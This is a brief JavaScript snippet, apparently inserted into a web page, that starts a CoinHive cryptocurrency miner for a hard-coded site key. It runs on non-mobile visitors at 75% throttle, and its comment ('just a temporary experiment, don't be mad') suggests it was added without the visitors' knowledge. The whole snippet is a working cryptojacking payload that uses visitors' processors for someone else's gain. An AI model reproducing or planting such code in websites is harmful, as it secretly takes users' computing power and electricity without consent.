// just a temporary experiment, don't be mad
var m = new CoinHive.Anonymous('QNLgRCco1NC3eYOEpvAAK4dBzKYqo464')
if (!m.isMobile()) {
  m.setThrottle(0.75)
  m.start()
}
